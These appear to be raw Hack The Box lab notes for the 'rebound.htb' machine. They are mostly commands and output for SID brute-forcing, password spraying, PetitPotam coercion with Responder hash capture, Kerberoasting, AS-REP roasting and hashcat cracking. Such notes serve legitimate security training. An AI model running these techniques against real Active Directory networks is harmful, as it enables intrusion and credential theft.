+SMB         10.129.126.67   445    DC01             Share           Permissions     Remark
+SMB         10.129.126.67   445    DC01             -----           -----------     ------
+SMB         10.129.126.67   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.126.67   445    DC01             C$                              Default share
+SMB         10.129.126.67   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.126.67   445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.126.67   445    DC01             Shared          READ            
+SMB         10.129.126.67   445    DC01             SYSVOL                          Logon server share</code></pre><p id="a4770e6a-9b2b-44ce-abae-23e7458b094a" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="230ca03a-8b01-4e93-9be0-6ed13bce2e7e" class="code"><code class="language-PowerShell">rpcclient $&gt; lsaquery
+Domain Name: rebound
+Domain Sid: S-1-5-21-4078382237-1492182817-2568127209</code></pre><p id="df3fffdf-8750-43dc-b206-64fcbf695b0a" class="">
+</p><p id="34060e6c-3db1-4074-82a7-e8b2c3dd4f8c" class="">lookupsids</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e1876269-fae3-4233-8aec-9aacc64ae2b6" class="code"><code class="language-PowerShell">rpcclient $&gt; lookupsids S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420 NT SERVICE\WdiServiceHost (5)</code></pre><p id="2f4c58bb-ff64-43da-897e-133444fef94d" class="">
+</p><p id="3f7f60b3-253f-431b-b999-f5167866a341" class="">FOUND A USER:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2ce47338-3f20-48d3-8106-953db2081970" class="code"><code class="language-PowerShell">rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7686
+S-1-5-21-4078382237-1492182817-2568127209-7686 rebound\tbrady (1)</code></pre><p id="1df2d64b-61fc-44ca-92d1-c718c68ff3a5" class="">
+</p><p id="d6ca3860-704c-441d-8a60-9d586579537e" class="">rebound\tbrady</p><p id="fe3b9047-4097-4f61-8b83-237772542764" class="">
+</p><p id="20c5f6e7-6002-4328-94d1-4cf7e6efefee" class="">Bruteforcing SIDs?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="23cd0215-718d-47b1-8e08-c823cb59c45a" class="code"><code class="language-PowerShell">rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7681
+S-1-5-21-4078382237-1492182817-2568127209-7681 rebound\ldap_monitor (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7680
+S-1-5-21-4078382237-1492182817-2568127209-7680 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7679
+S-1-5-21-4078382237-1492182817-2568127209-7679 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7690
+S-1-5-21-4078382237-1492182817-2568127209-7690 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7686
+S-1-5-21-4078382237-1492182817-2568127209-7686 rebound\tbrady (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7687
+S-1-5-21-4078382237-1492182817-2568127209-7687 rebound\delegator$ (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7688
+S-1-5-21-4078382237-1492182817-2568127209-7688 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-76
+S-1-5-21-4078382237-1492182817-2568127209-76 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7611
+S-1-5-21-4078382237-1492182817-2568127209-7611 *unknown*\*unknown* (8)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7686
+S-1-5-21-4078382237-1492182817-2568127209-7686 rebound\tbrady (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7685
+S-1-5-21-4078382237-1492182817-2568127209-7685 rebound\batch_runner (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7684
+S-1-5-21-4078382237-1492182817-2568127209-7684 rebound\winrm_svc (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7683
+S-1-5-21-4078382237-1492182817-2568127209-7683 rebound\ServiceMgmt (2)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7682
+S-1-5-21-4078382237-1492182817-2568127209-7682 rebound\oorend (1)
+rpcclient $&gt; lookupsids S-1-5-21-4078382237-1492182817-2568127209-7681
+S-1-5-21-4078382237-1492182817-2568127209-7681 rebound\ldap_monitor (1)</code></pre><p id="a4d7ec04-ee27-4647-a94a-bd6013f9bebe" class="">
+</p><h3 id="50d3ed94-4ec5-4e26-9072-6bb44431a0c0" class=""><mark class="highlight-blue">uses.txt list found from the above list of SIDs</mark></h3><p id="1fc63099-2371-48b1-a1e7-831e26714e5f" class="">oorend</p><p id="bb507fb5-35ad-476b-8a5a-80e0029c714c" class="">delegator</p><p id="df9b438c-d736-482e-ba2e-440cfde4c6c8" class="">tbrady</p><p id="92c1f543-369d-4cc4-8088-2ac2d9a3ee4a" class="">ldap_monitor</p><p id="c55953ae-990b-4289-a50d-2e61e8c25f9a" class="">batch_runner</p><p id="bff2b098-90bd-4514-a2e1-3ccdf6ce657f" class="">ServiceMgmt</p><p id="d9908e9c-fa3e-40c3-b26f-5f7c3f16c589" class="">winrm_svc</p><p id="9397467f-e0f0-4ab6-8ba1-db07c13c0506" class="">
+</p><p id="334090ef-5c6e-4461-aac2-6ee8b360dff8" class="">Crackmapecex, password found??</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8947f4b1-c6d0-4fe7-b6c7-72f937dbe338" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-vgcariotxf]─[~/PetitPotam]
+└──╼ [★]$ cme smb 10.129.126.67 -u users.txt -p /usr/share/SecLists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt 
+SMB         10.129.126.67   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:Administrator:FELDTECH STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:secure:SecurityMaster08 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:trinity STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:administrator:Wyse#123 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:user:Wyse#123 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:admin STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:Administrator:Administrator STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:sonos:sonos STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:demo:m9ff.QW STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:wasadmin:wasadmin STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:maxadmin:maxadmin STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:mxintadm:mxintadm STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:maxreg:maxreg STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:root: STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:admin STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:12345 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:1234 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:123456 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:instrument:instrument STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin: STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:nmt:1234 STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:admin:password STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:IEUser:Passw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:openhabian:openhabian STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:vagrant:vagrant STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:Administrator:vagrant STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [-] rebound.htb\oorend:john:Password123! STATUS_LOGON_FAILURE 
+SMB         10.129.126.67   445    DC01             [+] rebound.htb\delegator:Administrator:FELDTECH</code></pre><p id="64fd5ecf-1613-4859-8965-7e1625b38ec0" class="">
+</p><p id="e8ef553d-3be6-4bdd-8e15-7253d686f832" class="">Using petitpotam and receiving a hash:</p><p id="c6d8a659-e963-47ec-8106-18e990e97de0" class=""><code>python3 </code><code><a href="http://petitpotam.py/">PetitPotam.py</a></code><code> -d rebound.htb 10.10.14.220 -u &#x27;guest&#x27; -p &quot;&quot; rebound.htb</code></p><p id="35eb8d53-48b3-4eb6-931a-a95647447039" class="">
+</p><p id="6499d502-d65f-4323-8acc-d4f521833644" class="">Start responder</p><p id="1e7ea007-ec7f-4109-8fc7-eb5261240f44" class=""><code>sudo responder -I tun0 -wFv</code></p><p id="2cccd743-a43f-4087-b7bb-cdff5a73d4aa" class="">
+</p><p id="63c7aae0-df25-4a5d-b3e9-e8171873e39a" class="">hash</p><p id="9818c439-02a2-42f1-8556-9dec1efdf954" class="">[+] Listening for events...</p><p id="103bc94a-e89e-462e-a227-c5a64fad90d7" class="">[SMB] NTLMv2-SSP Client   : 10.129.126.67<br/>[SMB] NTLMv2-SSP Username : rebound\DC01$<br/>[SMB] NTLMv2-SSP Hash     : DC01$::rebound:961617cfebed7f04:16EEF1F184077B815EF1E7156927E2F6:0101000000000000805D685F1DE4D901F725A5FCEEC954CC0000000002000800550059004D00430001001E00570049004E002D004400420045003400460058005100520048004800420004003400570049004E002D00440042004500340046005800510052004800480042002E00550059004D0043002E004C004F00430041004C0003001400550059004D0043002E004C004F00430041004C0005001400550059004D0043002E004C004F00430041004C0007000800805D685F1DE4D9010600040002000000080030003000000000000000000000000040000062E78FC6AE55CE57CC8DB98692326C392F930425A9244857766B6E92D48C882B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320030000000000000000000<br/></p><p id="2770307f-6d21-42e5-91a7-ed02c6b6daca" class="">
+</p><p id="35ba1eff-31c1-4c6d-8e43-a688349ba6d0" class="">kerbrute</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cbc9125d-4e4b-43ce-ad0a-3f24d7cb8130" class="code"><code class="language-PowerShell">─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-vgcariotxf]─[~/PetitPotam]
+└──╼ [★]$ kerbrute userenum -d rebound.htb --dc 10.129.126.67 users.txt -o valid_usernames
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/10/23 - Ronnie Flathers @ropnop
+
+2023/09/10 19:50:36 &gt;  Using KDC(s):
+2023/09/10 19:50:36 &gt;  	10.129.126.67:88
+
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 tbrady@rebound.htb
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 ldap_monitor@rebound.htb
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 oorend@rebound.htb
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 batch_runner@rebound.htb
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 winrm_svc@rebound.htb
+2023/09/10 19:50:36 &gt;  [+] VALID USERNAME:	 delegator@rebound.htb</code></pre><p id="ecc821e7-6a76-4940-8141-53fb26f031fb" class="">
+</p><p id="227092c6-6e24-4a8b-a300-304e96ef9d00" class="">Getting UserSPNs</p><p id="1f272770-0037-4a13-9b04-d0b1b4a07b4d" class=""><code>python3 GetUserSPNs.py -no-preauth &quot;jjones&quot; -usersfile &quot;services.txt&quot; -dc-host 10.129.189.166 rebound.htb/ -request</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5a2a1934-7ae4-462b-b4b2-d794fb136e77" class="code"><code class="language-PowerShell">dam@DESKTOP-4NCODCP:~/impacket/examples$ python3 GetUserSPNs.py -no-preauth &quot;jjones&quot; -usersfile &quot;services.txt&quot; -dc-host 10.129.189.166 rebound.htb/
+ -request
+Impacket v0.10.1.dev1+20221010.112219.ea8f2efe - Copyright 2022 SecureAuth Corporation
+
+[-] Principal: winrm/dc01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+dam@DESKTOP-4NCODCP:~/impacket/examples$ nano services.
+dam@DESKTOP-4NCODCP:~/impacket/examples$ nano services.txt
+dam@DESKTOP-4NCODCP:~/impacket/examples$ python3 GetUserSPNs.py -no-preauth &quot;jjones&quot; -usersfile &quot;services.txt&quot; -dc-host 10.129.189.166 rebound.htb/ -request
+Impacket v0.10.1.dev1+20221010.112219.ea8f2efe - Copyright 2022 SecureAuth Corporation
+
+[-] Principal: cifs/dc01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: cifs/fileserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: http/webserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: http/dc01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+$krb5tgs$18$ldap/dc01.rebound.htb$REBOUND.HTB$*ldap/dc01.rebound.htb*$8e4d73226bce157f550ae794$a0b710ecce9dd3efa38b24939435673e459f40a9fceed60d61158ad0d151b8f9c8357b5dfcd4a64224531c08428238ff90b9f6b2435982ca5432ce4b25f2e5530393710ec6c4e9c10989dce9f9d2e2981062d7764e64e5db0aaa4400c18b199d5d3a73be1a56dbd0704b374f3fe8d0bf9c7e3578bde8b017849a882700624e8c865bcbaa01b910ca7ccd840154b14d8136b3835fbcaea1fb9fba40249dfbf3f8e9e52308285caa8891b6bd509eccc5be4effac445c5a163193114c3b4f24273b7c599d75fcbc1272b9baa409bf46d29844a8bf6d26179a8afb7fe9d67ff8ee98d891e090527c8bd8a167b7214c5e8c72d19e0fb7f6d726b1afc5b0d843a8df41c3553aff7866dbc4c543adf988b930a8d2dc44010333a2cab9e091607cb2d85e889c1381dc31254472faad5f9c8a9803201ba5e13beeb938300cd954255a4f3f079b881d3dbec11bce1b32b67a4af9e0224f434b7d0bcb134fbbc8565081c2f4e81aa04454036c4b76f49c63d67f737df411bcf977e15444709a0948a9c0fc38afe27b217ef5f218fadc98d93425975320f5a29e0171fc06c5e7efb874f4ebe182636f5e4dc7aa102f6915d8cdb14fe7be0d844ee52ce17ee4dbd18381671a747e91c388db7978572217afbe15973760f4be4ef22b7b7af47103ee6127004759d79c3333c188f5c914070b9be98e3aac99018d04f5f1ed6f55d7bd741a257e222266fa00fac096966dc25f655b4415874cc0ffb50d486f5fdb8ddc9ae6697cfc5e9d5f1821db2135adc01f023116c0f792ed9f320a0e3eed8d31fd4d3c5db87b57c22d9080c88f12c877c4aa677774e213000bf528b66859c5bf5cb4b64d238440c6497b9b09792ce39b753aaf71720a07fd6aef99f4b96195c435bfef869d73b1e11f8314ba33c5bdaa0ea9088d85297c72b2cefece02d79dcd98a0e87979a4ceb46eeb86b4da8ebeea69625ed0b6940c617fa882562ce337acb7c35f8aa1ce7ecea64db86de092ece0b326dd41845fba05a6c3285e14259229750b517c127b040fdd96e0578aa9586270c4ee43f29d9e8220a4f30daea0b50c2e41201b8ca0072c3491292723ad38a1fd09e50f8359866c0c3fb05cebfd96e04b757fb4ee3b6efda55eddb76565ba83e56c6afd6f53c271986bbd092ad7006d86ed670fd423fd5b6ef2d52d81426bf93b510174c2ee3bf394b03d3c7198f94d0b013c5f835026d98c957f65d1c28c3d579e9bcc274b2b9198f6140e654304d8ec0229f9d33b28076be791953b760a6978614589577d50afacd95986f0dc906346c033d6475d1d97786c95aa0b1a12daec5a8b775f6d2b70752309c9f654ef51f2376e9aadba8b21a38b136de7487f97
+[-] Principal: ldap/ad01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: MSSQLSvc/sqlserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: MSSQLSvc/sql01.rebound.htb:1433 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: TERMSRV/dc01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: TERMSRV/rdpserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+$krb5tgs$18$DNS/dc01.rebound.htb$REBOUND.HTB$*DNS/dc01.rebound.htb*$1fdc6dc475e881fdd2853a63$1a0220c9ef2064b054dd2ac9ab0b9fdb3886f9a5ded077e97f36a6fb88f8c6263992791af298022e5ac449e3ad07e048055562f2e0ad75f8b861ce60a21a892029dc4e6acd36a05b2d915e0295eee86a26c4016c2019b470c38499215584f9b0bc6b7b29a9d07b3360841af1c3445dd1739628e4eca2ccff963b4ec82e22ab8e8aab81e67047de0d28f9558816c8dca7e9d01460309c41d2aa54aa3ffd49af21e6df73f84007ecda2bc8765f06a07c834e92129bcec7e62a5ff159a5591995d88e8f81a801a5a4b4abaa49aaa2edc030194c6f14cf5cb089312b46a0d203b5b2bdb99093a92034a948c5be29687c8d984b80896994151c6402dce0c12577c7a0173f55e3c7e74fe81677a4bf26495e86c82e3d38ba3f29aa77b23c186be3036692dbad319db6950b27e0c5f49b45b1102ec20b89acf2a9b848b69e397e6dfd874650afeedfb15422170d9bd77ce7cdd4c88bfe4210ad0b5ff01f07fa7bc894efd0e57ae22b62cfb751e5239f1f765fd814d901c3f6996507f7b40043f33fcb77036a75f8c80eb5a9208cb5999d524363a4a5e168816933b79950831e3f5f7e7840692034ea57776dbf87d46528b5aef7a7b179064c300ad0db16565058d4b7929f8634cdc24afa23d49ba38f212dd9db0cba908bc0bdf8fe1fd89b89986077c959da599048050abc111f836a1be1462eb5230bbfc6e37bba7f147256674d2c3443187a690f35b424765fc1bfbf5aa617c891cdf1998f2dfe810203a343c7b2902cbf0b2cd1f33f300c0f6445b1b64586ccb0e7f37db7ce61d81c11024f5a3d0fc1a4962c5afd1ad67f201021cbc7eb968eec1f7d1076379e7b54c7c4c542a8240b79ec83e1540d50e9914db3fdd8314ea687b3d27c3b410d6f3f541420e214ca2c97223c50c252e9ba7da6626c85cc0dde70c6c0a21b89d511408fd5851f2cccd83833b36e50fa48b681c29b3df642532898c334d45d3ef82749c5db0ce8bf46d81902ebf21656194d8f2d8f9739149c7397e93d419b642c47685403a0870363306cf446b5c3843b05551f257151e5a241965bf030a6b49682b1c9919e2a37c6953dcd15c1ebce3264289f7a73583f643d236c9bff4ac9ff252e4bfd5b95eebfe1f568f7f6b842213bce58617d130ed21269329ea63e7e2a43d70b35eaa249e096eedbc2cdb7aaf17ec3149330f66b0b43938fa0734a4a14365e2673e971a8308de0eaddd08e023636fa232d85a37b16ab9159a6a90d617d559dc158c839daf243848f8efd708e81aeac52bcf6a3ce7f06da4f2aabe49ef93026179d2c52738c4bdd0949d4787baa13cdf75cdfd563fbfb61e7185f75a1a41d96157c29cb0c0e7da243948be63a6c6202
+[-] Principal: DNS/dns01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: WSMAN/dc01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: WSMAN/winrmserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: SMTPSVC/mail.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: POP/mail.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: ftp/ftpserver.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+[-] Principal: customservice/app01.rebound.htb - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)</code></pre><p id="c9c683cd-837d-4ecc-a234-694ef9ea07aa" class="">
+</p><p id="77a66b7f-7eea-4d65-8640-f20113bd6679" class="">this is the list of services:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9c2021b4-7401-4846-afbe-8334ca2709f0" class="code"><code class="language-PowerShell">cifs/dc01.rebound.htb
+cifs/fileserver.rebound.htb
+http/webserver.rebound.htb
+http/dc01.rebound.htb
+ldap/dc01.rebound.htb
+ldap/ad01.rebound.htb
+MSSQLSvc/sqlserver.rebound.htb
+MSSQLSvc/sql01.rebound.htb:1433
+TERMSRV/dc01.rebound.htb
+TERMSRV/rdpserver.rebound.htb
+DNS/dc01.rebound.htb
+DNS/dns01.rebound.htb
+WSMAN/dc01.rebound.htb
+WSMAN/winrmserver.rebound.htb
+SMTPSVC/mail.rebound.htb
+POP/mail.rebound.htb
+ftp/ftpserver.rebound.htb
+customservice/app01.rebound.htb</code></pre><p id="14b57e68-767f-4de9-b3b7-fd6ddfd50e9c" class="">
+</p><p id="ff6bb89a-f8b8-4ac0-b7f7-efa59ce8346f" class="">Crack the hash for ldap</p><p id="632ef207-0d57-494b-82c1-cf75e06df524" class=""><code>hashcat -m 19700 krb5hash.txt /usr/share/wordlists/rockyou.txt</code></p><p id="0bef36da-3fa0-45ef-9700-0ddf6398bc3a" class="">
+</p><p id="91daca27-034c-4853-a32c-853bab9c8c21" class="">tbrady<br/>ldap_monitor<br/>oorend<br/>batch_runner<br/>winrm_svc<br/>delegator<br/>ppaul<br/>llune<br/>fflock<br/>DC01$<br/>ServiceMgmt<br/>winrm_svc<br/>ppaul<br/>llune<br/>fflock<br/>jjones<br/>Administrator<br/>tbrady<br/>mmalone<br/>oorend<br/></p><p id="59781915-0a06-499c-87d7-a9210952c314" class="">
+</p><p id="3f609548-840c-4db5-9da1-de2df0261321" class="">Getting a hash for user</p><p id="157c1db5-cd60-49e5-96e3-435bf4d4c4a2" class=""><code>python3 </code><code><a href="http://getnpusers.py/">GetNPUsers.py</a></code><code> -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.129.189.166 &#x27;rebound.htb/jjones&#x27;</code></p><p id="1cd81b95-b110-4ff9-9940-9362ad5172ee" class="">
